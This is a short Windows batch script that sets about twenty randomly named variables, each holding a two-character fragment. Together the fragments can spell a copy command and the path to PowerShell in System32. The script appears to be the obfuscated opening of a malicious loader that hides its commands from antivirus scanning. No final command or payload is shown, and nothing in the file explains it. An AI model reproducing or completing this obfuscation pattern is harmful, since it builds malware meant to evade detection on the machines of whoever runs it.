@echo off
set "cZtUtagxcI=0\"
set "ZIbtIjvGiA=do"
set "DNotGfSoND=1."
set "ixBtgWqEvp=\v"
set "hfRlvQMiSd=he"
set "HLSrymagzH=rS"
set "pNDedrXwds=py"
set "aylYGQCzns=32"
set "JXQjZZfvQw=s\"
set "zHvyWpKzcO=ws"
set "yrfURakORu=em"
set "swbtoBMuvA=Wi"
set "QSCMkPLWTW=he"
set "zhNDzCsmNj=we"
set "eNbrzJEyez=po"
set "xjGGScsbSX=\W"
set "GYyXIGFatJ=xe"
set "IGFPrcgIQu=st"
set "BukndUmQvR=ll"
set "IjWTBEUObO=Po"
set "mJgtMHzGwN=co"
